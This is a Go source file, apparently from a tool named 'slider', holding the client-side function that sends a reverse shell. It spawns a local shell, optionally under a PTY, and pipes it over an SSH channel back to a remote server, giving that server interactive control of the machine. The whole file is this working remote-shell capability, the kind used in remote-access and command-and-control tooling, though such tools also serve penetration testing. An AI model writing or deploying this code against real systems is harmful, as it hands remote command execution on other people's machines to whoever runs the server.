//go:build !windows

package client

import (
	"encoding/json"
	"fmt"
	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
	"io"
	"os/exec"
	"slider/pkg/interpreter"
)

func (c *client) sendReverseShell(request *ssh.Request) {
	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
	if openErr != nil {
		c.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer func() { _ = channel.Close() }()

	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec

	// Request Server Term Size
	_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
	if reqErr != nil {
		c.Errorf("%v", reqErr)
	}
	var termSize interpreter.TermSize
	if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
		// If error term initializes with size 0 0
		c.Errorf("%v", unMarshalErr)
	}

	if c.interpreter.PtyOn {
		// Notify server we will be sending a PTY
		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
		if errSSHReq != nil {
			c.Errorf("pty-req %v", errSSHReq)
		}

		// Notify server we will send a Reverse Shell
		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
		if errSSHReq != nil {
			c.Errorf("pty-req %v", errSSHReq)
		}

		c.ptyFile, _ = pty.StartWithSize(cmd, &pty.Winsize{
			Rows: uint16(termSize.Rows),
			Cols: uint16(termSize.Cols),
		})

		// Copy all SSH session output to the term
		go func() {
			if _, outCopyErr := io.Copy(c.ptyFile, channel); outCopyErr != nil {
				c.Debugf("Copy stdout: %s", outCopyErr)
			}
		}()

		// Answer Server we are good to go
		_ = c.replyConnRequest(request, true, []byte("shell-ready"))

		// Copy term output to SSH session stdin
		if _, inCopyErr := io.Copy(channel, c.ptyFile); inCopyErr != nil {
			c.Debugf("Copy stdin: %s", inCopyErr)
		}
	} else {
		// Notify server we will send a Reverse Shell
		_, errSSHReq := channel.SendRequest("reverse-shell", true, nil)
		if errSSHReq != nil {
			c.Errorf("reverse-shell %v", errSSHReq)
		}

		pr, pw := io.Pipe()

		cmd.Stdin = channel
		cmd.Stdout = pw
		cmd.Stderr = pw
		go func() { _, _ = io.Copy(channel, pr) }()

		environment := []string{
			fmt.Sprintf("LINES=%d", termSize.Rows),
			fmt.Sprintf("COLUMNS=%d", termSize.Cols),
		}
		for _, envVar := range environment {
			cmd.Env = append(cmd.Environ(), envVar)
		}

		// Answer Server we are good to go
		_ = c.replyConnRequest(request, true, []byte("shell-ready"))

		if runErr := cmd.Run(); runErr != nil {
			c.Errorf("failed to execute command error - %v", runErr)
		}
	}
}
